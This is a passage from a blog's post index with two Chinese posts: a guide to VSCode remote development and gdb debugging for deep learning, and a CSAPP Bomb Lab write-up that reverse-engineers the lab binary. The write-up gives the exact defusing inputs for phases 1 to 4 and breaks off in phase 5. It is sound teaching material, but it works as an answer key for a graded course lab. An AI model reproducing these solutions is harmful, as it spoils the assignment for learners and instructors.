    
        ,"post4": {
            "title": "VSCode 配置最舒适的深度学习开发环境",
            "content": "0x0 引言 . 深度学习往往需要强大的算力和硬件作为支撑，这使得深度学习下的模型和算法大多需要在服务器和集群上运行，区别于传统的程序开发可以在本地的机器上运行，这给深度学习的开发带来了新的挑战。 . 在以前，远程开发需要 SSH 登录到服务器上使用命令行和终端进行开发，相比于 Vim 的使用好手可以在终端眼花缭乱地操作代码，大部分人更习惯于 UI 界面和图形化的开发工具，而适应和学习远程开发无疑降低了代码开发效率。而除了代码开发之外，debug 模型和算法也占据着算法开发的一大部分时间，成熟的软件提供了好的 debugger 工具，而远程开发只有命令行和一些 unix 软件，又需要额外学习命令行 debug 的工具链，比如 ipdb 和 gdb。 . 然而现在已经是 2022 年了，远程开发早已变得司空见惯，也有很多软件支持了远程开发的方式，这使得我们不再需要面对黑漆漆的终端和命令行进行开发，也不需要先学习很多复杂的 debugger 工具才能进行模型和算法的开发，极大地增加了我们的开发效率，这篇文章就是总结了笔者经过一段时间探索之后所搭建的最舒适的深度学习开发环境以及一些 debug 的教程。 . 0x1 选择 VSCode 的原因 . 对于远程开发来说，有两种方式，一种是本地写代码，然后和远程服务器同步代码；还有一种是直接在服务器上进行开发和写代码。 . 如果在本地开发代码，不管是用编辑器还是 IDE，最后都需要将代码传到到远程服务器上，而本地环境和远程服务器多少有一些不同，有的时候本地能跑通的代码同步上去可能会有 bug，需要经过二次调试才能在服务器上跑通，而且有一些代码补全功能因为服务器端和本地的环境不同也没法实现，这样的开发效率并不高。 . 效率更高的开发方式还是直接在远程服务器上进行开发，而炼丹一般来说都是以 Python 语言为主，所以目前有三种方式可以实现远程开发： . SSH 到远程服务器上，然后用 Vim 写代码 . 这就是上古时期大神们的开发方式，不过 Vim 的学习成本相对较高，同时 Vim 还需要安装一些插件，进行一定的配置才能比较丝滑地进行开发，否则 Vim 就是一个白板编辑器，而这些步骤相对繁琐，不太适合大部分的炼丹师，容易磨灭大家炼丹的热情； . | PyCharm 专业版 . PyCharm 的专业版提供一个远程同步服务器的功能，同时还可以配置远程的解释器，相当于代码还是在本地写，不过 PyCharm 会帮你自动同步到远程，同时还可以利用远程的解释器进行代码的提示和自动补全，相当于在本地可以享受到远程服务器的开发环境； . 虽然 PyCharm 的使用体验看上去非常方便以及丝滑，这也作为笔者之前一段时间的开发工具，不过使用一段时间之后发现了下面 4 个问题： . 专业版需要付费，不像社区版可以免费使用，虽然学生党可以用自己的学校邮箱申请免费使用，不过工作党就只能自己掏钱了，用破解版还是有较大的风险； | PyCharm 开发并不是真正在远程进行的，而是通过 SFTP 将本地代码传上去，有的时候可能会出现本地代码没有同步上去的问题，而且有的公司内网需要跳板机才能访问，也就是需要两次 SSH，虽然有解决办法绕过去，但是还是比较麻烦； | PyCharm 比较占内存，而一般我们本地开发都是用自己的笔记本，配置一般不会很高，这时候就容易出现卡顿和发热的现象； | 最后一个问题是 PyCharm 作为一个 Python 的 IDE，非常适合进行 Python 开发，而对于多语言的开发环境就比较难用了，比如深度学习有时还需要写 C++/CUDA； | . | VSCode Remote-SSH . VSCode 也提供了一种远程开发模式可以直接在服务器上写代码，不占用本地机器的内存，同时利用服务器端的开发环境，也不存在开发环境切换的问题，另外有很多社区和官方的插件，配置也比 Vim 简单很多，也能实现代码的自动跳转等功能，对于多语言开发来讲也比较友好，总体来说结合了 Vim 和 PyCharm 各自的优点。 . 虽然看上去 VSCode 具备非常大的优点，但是 VSCode 并没有在社区一统天下，它也有一些缺点： . Python 的代码编写体验弱于 PyCharm ，代码补全和跳转没有办法做到 PyCharm 那么给力，毕竟 PyCharm 的定位是 Python IDE，而 VSCode 的定位只是一个编辑器； | Debug 调试上 PyCharm 不管是 UI 还是 feature 都要比 VSCode 强一些，VSCode 的 debug 还是有一定的学习成本； | PyCharm 额外集成了 Django Tools 等工具是 VSCode 没有的； | 对于非常大型的项目， VSCode 可能连整个项目的 index 都没法完成，代码跳转等功能会出现间歇性抽风； | . | 上面讲了三种开发方式，一般来说主流的方案都是在 PyCharm 和 VSCode 中选择，上面也列举了不同开发方式各自的优缺点，而笔者最终选择使用 VSCode 作为开发环境也是权衡了上面的利弊。 . 不过争论到底哪种方式更好其实没有意义，因为最终也不会有结论，大家按照自己的需求进行选择即可。这篇文章也不是为了说服使用 PyCharm 的同学转入 VSCode 的怀抱，更多会讲讲自己是如何配置 VSCode 以及怎么使用 VSCode 能够最大限度发挥其优势，希望能够帮助到正在使用 VSCode 的同学。 . 0x2 深度学习必备插件 . 使用 VSCode 进行深度学习相关的开发，主要用到的语言就是 Python 和 C++/CUDA，所以下面列举一下使用这两种语言需要用的插件是哪些，另外一些 UI、主题以及一些工具类的插件这里就不在赘述了，毕竟这些内容都是高度个性化的东西，和本文的主题关系并不大，大家可以按照自己的喜好进行这类插件的安装。 . 0x2.1 Python 插件 . 对于 Python 开发，主要使用的插件是下面两个： . Python - Visual Studio Marketplace: 微软官方 Python 扩展，支持 Python2、3，最重要的是支持 python debugging 功能，这里在后面会具体讲到； | Pylance - Visual Studio Marketplace: 微软官方 Python 语言服务器，提供丰富的静态类型检查和自动补全，这会极大提高编程效率； | . 这两个 Python 插件的配置比较简单，在左边的扩展进行搜索，找到之后直接进行下载即可，基本没有坑。 . 0x2.2 C/C++ 相关插件 . clangd - Visual Studio Marketplace: LLVM 针对 C/C++ 提供的 Language Server Protocol，可以用它来自动补全代码，实现自动跳转的功能； | Native Debug - Visual Studio Marketplace: 主要是用 gdb 来 debug C/C++ 代码； | . 在安装完 clangd 的插件之后，可以调出 VSCode 的命令面板，输入 clangd 可以看到自动下载 clangd 的扩展包，可能因为不可描述的服务器网络问题导致扩展包下载失败，可以访问 clangd 的官网进行手工安装。 . 注意：请确保微软官方的 C/C++ 插件已经卸载或者禁用，否则会出现冲突。因为微软的 C++ 插件存在内存泄露和僵尸进程等问题，所以推荐使用上面的插件进行平替。 . 0x3 Debug Python 代码 . 前面安装的两个 Python 插件，其中 Pylance 提供了 language server protocol 可以自动补全代码，让 Python 的编写效率提高，另外一个插件除了提供语法高亮等内容之外，还提供了非常强大的 debug 功能，如果没有了解的同学可以先阅读一下官方教程 Debugging configurations for Python apps in Visual Studio Code ，下面举两个例子来说明如何使用 VSCode 高效开发模型。 . 0x3.1 自动定位到错误代码行 . 有的时候我们会拿到一份可以跑通的代码，但是可能轻微修改完一些超参之后代码就跑不通了，这个时候我们就需要去查看报错信息，而报错信息往往包含很多调用栈，需要在一堆信息中寻找真正的报错位置。 . 我们可以用下面的报错信息举例，一份训练代码在修改了一个超参之后就出现了下面的报错，通过查看最终的报错信息可以知道好像是某个 BN 层的输入和参数维度对不上，但是网络中有那么多 BN 层，也很难定位是哪个 BN。接着我们可以不断往前找，最终会发现是在 embedding_head.py 中的 124 行的 bottleneck 调用的时候出现的报错，而 bottleneck 具体在哪里需要继续在代码里面进行查看。 . Traceback (most recent call last): File &quot;tools/train_net.py&quot;, line 57, in &lt;module&gt; args=(args,), File &quot;./fastreid/engine/launch.py&quot;, line 71, in launch main_func(*args) File &quot;tools/train_net.py&quot;, line 45, in main return trainer.train() File &quot;./fastreid/engine/defaults.py&quot;, line 348, in train super().train(self.start_epoch, self.max_epoch, self.iters_per_epoch) File &quot;./fastreid/engine/train_loop.py&quot;, line 145, in train self.run_step() File &quot;./fastreid/engine/defaults.py&quot;, line 357, in run_step self._trainer.run_step() File &quot;./fastreid/engine/train_loop.py&quot;, line 241, in run_step loss_dict = self.model(data) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/module.py&quot;, line 1051, in _call_impl return forward_call(*input, **kwargs) File &quot;./fastreid/modeling/meta_arch/baseline.py&quot;, line 112, in forward outputs = self.heads(features, targets) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/module.py&quot;, line 1051, in _call_impl return forward_call(*input, **kwargs) File &quot;./fastreid/modeling/heads/embedding_head.py&quot;, line 124, in forward neck_feat = self.bottleneck(pool_feat) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/module.py&quot;, line 1051, in _call_impl return forward_call(*input, **kwargs) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/container.py&quot;, line 139, in forward input = module(input) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/module.py&quot;, line 1051, in _call_impl return forward_call(*input, **kwargs) File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/modules/batchnorm.py&quot;, line 178, in forward self.eps, File &quot;/home/dev/.local/lib/python3.6/site-packages/torch/nn/functional.py&quot;, line 2282, in batch_norm input, weight, bias, running_mean, running_var, training, momentum, eps, torch.backends.cudnn.enabled RuntimeError: running_mean should contain 2048 elements not 1024 . 通过上面的方式确实可以定位到错误的地方，但是有没有更高效的 debug 方式呢？下面我们使用 VSCode 进行 debug 来比较两者的差别。根据官网的教程对 debug 进行配置，配置文件一般在 .vscode/launch.json 中。 . 一个参考配置文件如下，program 为要运行的程序，args 可以将命令行参数传进来，所以下面的 debug 配置转换成 shell 命令即为 python3 tools/train_net.py --config-file configs/Market1501/bagtricks_R50.yml 命令。 . { &quot;name&quot;: &quot;model training&quot;, &quot;type&quot;: &quot;python&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;tools/train_net.py&quot;, &quot;args&quot;: [ &quot;--config-file&quot;, &quot;configs/Market1501/bagtricks_R50.yml&quot;, ], &quot;console&quot;: &quot;integratedTerminal&quot; } . 完成 debug 配置之后，可以通过 F5 或者左边的绿色箭头进行 debug，运行之后可以代码会自动停在报错的位置。 . . 仍然是和上面相同的报错，不同在于可以通过 UI 进行展示，不需要去报错里面一层一层的找，另外还有一个好处是可以直观的从左边看到调用栈的信息，同时可以随机进入任何一个调用栈，除此之外还提供了 console 窗口，可以直接打印中间的一些变量结果便于进一步定位问题。 . . 0x3.2 单步调试代码 . 除了快速定位问题之外，调试模型的过程中，形状和维度一般是很容易出错的问题，需要不断地检查。下面演示一下在 python debugger 中进行单步调试形状，同时在调试过程中还可以实时查看变量的信息，另外可以不断新增断点，运行到断点位置，可以查看下面的演示。 . . 0x4 Debug C/C++ 代码 . c++ 代码一般会使用 gdb 进行 debug，gdb 也非常强大，可以实现很多功能，不过他的一个缺点就是没有图形界面，在调试复杂代码的时候效率非常低，比如需要不断地打断点，每次 next/step 之后都需要用 list 看一下前后的源码，这种方式虽然也可以达成目标，不过无疑让 debug 的效率降低了。 . 因为这个原因，市面上也出现了很多搭配 gdb 使用的工具，比如 gdbinit, cgdb 等工具，更多详情可以查看这里 终端调试哪家强？ - 知乎 (zhihu.com). . 除了上面这些选择之外，还可以搭配 vscode 进行 gdb debug，通过 UI 界面让 gdb 变得更加高效和方便。比如可以在任何位置打断点，进行单步运行，查看变量的值，以及通过条件断点让一个循环在需要的位置停下来，还可以通过 coredump 文件进行 debug，直接访问到异常抛出的位置等等。 . 下面使用 gdb Tutorial (cmu.edu) 作为例子，可以去里面查看对应的代码和编译。 . 首先在 VSCode 中的 launch.json 进行下面的配置 . { &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;gdb&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;target&quot;: &quot;./build/gdb_debug&quot;, &quot;autorun&quot;: [&quot;catch throw&quot;], &quot;cwd&quot;: &quot;${workspaceRoot}&quot;, &quot;valuesFormatting&quot;: &quot;parseText&quot; } . 接着点击左边的绿色运行箭头或者是 F5 既可以直接开始运行代码，这是会发现代码会在下面的位置抛出异常，左边是函数的调用栈，中间黄色高亮的代码行为运行的位置。 . . 在下面 console 中可以输入 gdb 的命令进行调试，比如下面我们访问 backtrace，然后访问地址 0x7fffffffd684 对应的元素，最后发现 linked list 在移除 1 的时候出现异常。 . . 上面发现当链表在移除 1 的时候会抛出异常，所以我们希望程序前面 remove 其他元素的时候能够正常执行，只在 remove 1 的时候停下，这个时候就需要借助条件断点，在 gdb 中可以通过下面的命令进行实现 condition 1 item_to_remove==1，不过使用 VSCode 会更方便一点，可以通过下面的方式在 UI 上进行操作。 . . 当程序停在了我们期望的位置，接下来就可以进行单步调试来确定出问题的地方，如果使用 gdb 需要在终端不断地进行 next 指令，同时通过 list 查看具体的代码位置，而在 VSCode 中可以利用现成的 UI 界面，这个时候调试会更加直观。 . . 如果发现自己无法在 VSCode 用鼠标打断点，那么在设置里面搜索 Debug: Allow Breakpoints Everywhere，打上勾应该就可以了。 . 0x5 Debug Python/C++ 混合代码 . 除了调试单独的 Python 和 C++ 代码外，在深度学习中还有一种常见的场景是 Python 和 C++ 混合调试，因为深度学习需要大量的计算，所以大部分计算相关的代码都是用 C++ 或者 CUDA 写的，Python 只是作为前端和接口方便使用。 . 在调试深度学习模型或者算子的时候，常常需要从 Python 层作为入口，但是最终需要 Debug 到 C++ 层的代码，下面使用 relu 算子举例，如何从进行 Python/C++ 混合 debug。 . 其实这种类型的 debug 借助 gdb 就可以实现，在命令行里面输入下面的指令即可 . # option1 gdb --args python test_relu.py b &lt;C++ function to break at&gt; run # option2 gdb python b &lt;C++ function to break at&gt; run relu.py . 不过用上面的方式在 debug 简单的代码还行，当代码比较复杂之后，还是需要更有效率的 debug 方式，这个时候使用 VSCode 提供的 UI 就可以帮上大忙。 . 在 VSCode 中按照下面的方式进行配置 . { &quot;name&quot;: &quot;gdb debug&quot;, &quot;type&quot;: &quot;gdb&quot;, &quot;request&quot;: &quot;launch&quot;, // &quot;env&quot;: {&quot;PYTHONPATH&quot;: &quot;your python path&quot;}, optional environment variable &quot;target&quot;: &quot;/home/dev/miniconda/bin/python&quot;, &quot;arguments&quot;: &quot;test_relu.py&quot;, &quot;autorun&quot;: [&quot;catch throw&quot;], &quot;cwd&quot;: &quot;${workspaceRoot}&quot;, &quot;valuesFormatting&quot;: &quot;parseText&quot; } . 按下左边的绿色箭头或者是 F5 程序就可以运行了，提前在对应的 C++ 中打上断点，程序最终会在断点位置停下来，然后可以进行单步调试或者是使用 gdb 中的命令在 console 中进行想要的操作，非常方便。 . . 0x6 总结 . 这篇文章中我们介绍了使用 VSCode 的 Python Debugger 进行 Python 代码的调试，以及配合 gdb 这个强大的工具对 C++ 和 Python/C++ 混合代码的调试，通过 VSCode 的 UI 以及可交互的 debug 方式可以增加程序开发的效率，希望这篇文章对你有帮助。 . 如果有任何问题，欢迎在评论去留言。 . 0x7 Reference . PyCharm+Docker：打造最舒适的深度学习炼丹炉 - 知乎 (zhihu.com) | Docker+VSCode配置属于自己的炼丹炉 - 知乎 (zhihu.com) | VSCode+Docker: 打造最舒适的深度学习环境 - 知乎 (zhihu.com) | VSCode 配置 C/C++ 终极解决方案：vs code+clang+clangd+lldb （利用完整的 clang-llvm 工具链） - 知乎 (zhihu.com) | PyTorch Internals 1：源代码调试方法 - 知乎 (zhihu.com) | gdb Tutorial (cmu.edu) | 终端调试哪家强？ - 知乎 (zhihu.com) | .",
            "url": "https://l1aoxingyu.github.io/blogpages/vscode/tool/development/deep%20learning/2022/02/19/vscode-develop_tool.html",
            "relUrl": "/vscode/tool/development/deep%20learning/2022/02/19/vscode-develop_tool.html",
            "date": " • Feb 19, 2022"
        }
        
    
  
    
        ,"post5": {
            "title": "CSAPP 之 Bomb Lab",
            "content": "0x0 Introduction . 该实验提供了一个 “binary bomb”，这是一个编译好的二进制程序，在运行过程中需要用户提供 6 次输入，如果有任何一次不正确，炸弹就会爆炸。 . 在这个实验中，我们需要做逆向工程对炸弹进行拆解，对这个二进制程序进行反汇编后，通过阅读他的汇编代码，获取需要输入的 6 个字符串是什么。 . 在这次实验中，主要使用的工具如下： . objdump: 将二进制文件进行反汇编； | vscode：阅读和注解汇编代码的编辑器； | cgdb(gdb)：单步调试汇编代码的 debugger； | . 通过下面的命令即可对二进制程序进行反汇编，最终获得 bomb.asm 代码，还可以在 vscode 中安装 asm 插件实现代码的高亮。 . objdump bomb -d &gt; bomb.asm . . 0x1 实验阶段 . 0x1.1 phase_1 . 下面的 c 代码包含了第一阶段的所有内容 . /* Hmm... Six phases must be more secure than one phase! */ input = read_line(); /* Get input */ phase_1(input); /* Run the phase */ phase_defused(); /* Drat! They figured it out! * Let me know how they did it. */ /* Border relations with Canada have never been better. */ . 代码非常简单，程序读取输入之后，送到 phase_1 这个函数中进行处理，如果函数顺利退出则表示炸弹被拆掉，输入指令正确。 . 通过在汇编代码中搜索 phase_1 即可找到其在汇编代码中的片段 . 0000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq . 简单阅读这一段汇编代码，主要是调用了 strings_not_equal 这个函数，而通过名字可以大概了解这就是一个判断字符串是否相等的函数。 . 而上面有一段代码将地址 0x402400 移动到寄存器 %esi 中，通过查表可以了解到 %esi 是函数的第二个参数，而调用 phase_1 时，汇编代码如下，发现是通过 read_line 这个函数，将用户输入的结果移动到寄存器 %rdi 中，而这恰好是函数的第一个参数，所以可以得到第一阶段即要对比用户输入的字符串和 0x402400 这个地址存放的字符串是否相等。 . 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; 400e37: 48 89 c7 mov %rax,%rdi 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; . 通过 cgdb 启动程序，在 phase_1 处打断点，注意这里断点需要打到汇编代码中，可以直接通过 b phase_1 打断点，也可以通过地址进行打断点，比如 b *0x400ee0，接着直接运行。 . 在 gdb 中通过 ni 可以在汇编代码中进行单步运行，我们可以运行到 strings_not_equal 这个函数调用前，接着通过 p (char*)0x402400 即可获得这个地址对应的字符串如下 . (gdb) p (char*)(0x402400) $6 = 0x402400 &quot;Border relations with Canada have never been better.&quot; . 接着可以尝试在 phase_1 输入这段字符串，可以获得下面的结果，说明 pahse_1 的输入指令正确，炸弹已经成功拆除了。 . Phase 1 defused. How about the next one? . 0x1.2 phase_2 . 接着需要输入第二段字符，首先可以通过 b phase_2 直接在第二阶段开始时打上断点，然后随意输入一段字符以进入这个函数。 . 通过下面的汇编代码片段，发现调用了函数 read_six_numbers，其实通过函数名就可以发现这个函数需要输入 6 个数字，接着紧跟着的代码是执行 cmpl $0x1, (%rsp)，如果相等直接跳到 0x400f30，否则会调用 explode_bomb，这说明了要求输入的第一个数字必须是 1，否则炸弹会爆炸。 . 0000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; . 为了进一步确定 read_six_numbers 是要求我们输入 6 个数字，我们搜索对应的函数名，可以获得下面的汇编代码段 . 000000000040145c &lt;read_six_numbers&gt;: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 &lt;read_six_numbers+0x3d&gt; 401494: e8 a1 ff ff ff callq 40143a &lt;explode_bomb&gt; 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq . 注意 0x40148f 对应的代码行，scanf 返回的结果和 5 进行比较，需要比 5 大，否则炸弹会爆炸。 . 接着代码会跳到 0x400f30，继续往下找对应的代码，会发现这一段代码比较重要。 . 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; . 其中 (%rsp) 表示第一个输入的数字，因为是 int 类型，所以内存中占用的长度是** 4 个字节**，那么0x4(%rsx) 表示第二个输入的数字，0x18(%rsp) 并不是表示第六个输入的数字，而是表示第六个数字之后的地址，后面会讲为什么需要这样设置。 . 可以发现代码又跳转到 0x400f17 地址，首先 mov -0x4(%rbx),%eax 即可将第一个输入的数字放到寄存器 %eax 中，然后 add %eax,%eax 其实就是将数字*2，然后判断 %eax 和 (%rbx) 是否相等，如果不相等则炸弹会爆炸，由此可以看出我们需要输入 6 个数字，第一个是 1，然后每一个后面的数字都是前面数字的两倍。 . 最后可以通过 add $0x4,%rbx 不断遍历下一个元素，然后通过 %rbp 和 %rbx 是否相等的判断来决定跳出循环，注意 (%rsp) 表示第一个数字，那么0x14(%rsp)表示第六个数字，所以0x18(%rsp)表示第六个数字之后的地址，通过和这个地址作比较，可以确保遍历完所有的 6 个数字。 . 最后这 6 个数字为 1 2 4 8 16 32，输入这些数字即可解除第二阶段的炸弹。 . 0x1.3 phase_3 . 接着需要输入第三段字符，首先可以通过 b phase_3 直接在第三阶段开始的时候打上断点，然后输入一段字符以进入这个函数。 . 通过阅读下面这段汇编代码，可以发现，scanf 的返回值需要大于1，否则炸弹就会爆炸，这也就是说至少需要输入2个数字。 . 接着继续查看下面的代码，发现需要比较 $0x7 和 0x8(%rsp)，通过 x (%rsp+0x8) ，可以发现0x8(%rsp) 表示第一个数字的地址，进一步可以发现 0xc(%rsp)表示第二个数字的地址，地址差距是 4 个字节，说明是 int32 的数据类型。 . 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; ... 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; . 所以这一段代码即表示如果输入的第一个参数比7大，则会跳到 0x400fad 这个位置继续执行，而这个位置执行的函数为 explode_bomb，这也就是间接说明了需要输入的第一个数字&lt;=7。 . 接着继续执行下面的代码，首先将第一个数字放到寄存器 $eax 中，然后执行 jmpq 指令，跳转的地址是 0x402470 + 8 * $rax 位置的指针指向的内容，这里我们可以通过在 gdb 中输入 ni 进行单步执行，来判断最终代码跳转的位置，如果输入的第一个数字是1，那么也可以通过p/x *(0x402470+8)或者是 x/x 0x402470+8 来计算出具体的位置。 . 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) . 接着直接跳到对应的位置去查看代码，可以发现下面的代码需要比较输入的第二个数字和 0x137 的大小，因为首先通过 mov $0x137,%eax 将 0x137 移动到寄存器 $eax 中，然后通过 cmp 0xc(%rsp),%eax 来比较寄存器 $eax 的值以及地址 0xc(%rsp) 指向内存的值，从前面可以知道这是第二个输入的数字。 . 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; . 所以输入的第二个数字换成十进制则是 311 ，于是输入 1 311 即可接触第三个炸弹，因为要求第一个数字 &lt;=7，所以这里只描述了一种可能性，也可以尝试第一个数字输入是2，会发现程序会跳到 0x400f83，需要输入的第二个数字是 707. . 0x1.4 phase_4 . 下一个阶段主要考察了对递归函数的 reverse engineering，首先在 phase_4 开始阶段打上断点，然后运行进入，首先查看下面这段汇编代码 . 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; . 可以发现需要我们通过 scanf 输入一些内容，通过在 gdb 中查看 scanf 需要的输入个数和类型如下 . (gdb) x /s 0x4025cf 0x4025cf: &quot;%d %d&quot; . 说明需要输入两个 int 类型的数字，同时通过 cmp $0x2,%eax 也可以证实这点，另外还通过 cmpl $0xe,0x8(%rsp) 要求输入的第一个数字必须要 &lt;=14，接着代码会跳到地址 40103a 继续执行。 . 然后查看对应位置的汇编代码，发现整体逻辑是调用 func4，判断返回值是否为0，如果不是 0，那么直接跳到 0x401058 就触发爆炸，如果是 0 则可以继续判断输入的第二个数字是否是 0，如果是 0，那么顺利解除炸弹。 . 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; . 看到这里，整体已经比较清晰了，输入两个数字，第一个需要不比 14 大，第二个必须是0，然后调用 func4 需要保证返回值是 0，而其输入的参数分别在寄存器 %rdi, %rsi, %rdx，继续分析这些寄存器的获得方法，可以发现，第一个参数就是我们输入的第一个数字，第二个参数是 0，第三个参数是 14，所以接下来只需要进一步分析 func4 即可。 . 在汇编代码中搜索 func4 即可找到对应的代码片段 . 0000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq . 整体代码并不长，但是里面有两处存在递归调用，如果使用 gdb 进行单步调试会比较绕，所以这里直接对汇编代码进行反向工程，获得对应的 c 代码如下 . int func4(int x, int a1, int a2) { int m = (a2 - a1) / 2; int n = m + a1; if (n == x) return 0; if (n &lt; x) { m = func4(x, n + 1, a2); return 2 * m + 1; } else { m = func4(x, a1, n - 1); return 2 * m; } } . 因为该函数需要返回的值是 0，所以只能走 n==x 和 n&gt;x 这两个分支，否则会返回 2*m+1，那么结果必然不会是 0，而由前面知道 a1=0, a2=14，所以不断计算 n 的值即可求出所有符合条件的输入 x，如果嫌麻烦，也可以直接把运行这段代码来找符合条件的值。 . 最终符合条件的值是 0,1,3,7，输入这四个值中的任意一个作为第一个数字输入，均可成功拆除炸弹。 . 0x1.5 phase_5 . 进入到 phase_5 之后，注意到下面这一段汇编代码 . 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; . 其中 xor %eax,%eax 其实等价于将 %eax 置零，然后通过 string_length 来判断输入的字符串长度，后面通过 cmp $0x6,%eax 比较字符串长度和 6 的大小，如果不相等则会引发爆炸，如果相等，可以跳到地址为 0x4010d2 继续执行。 . 继续往后执行，可以发现会进入到下面这一段循环代码中 . 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 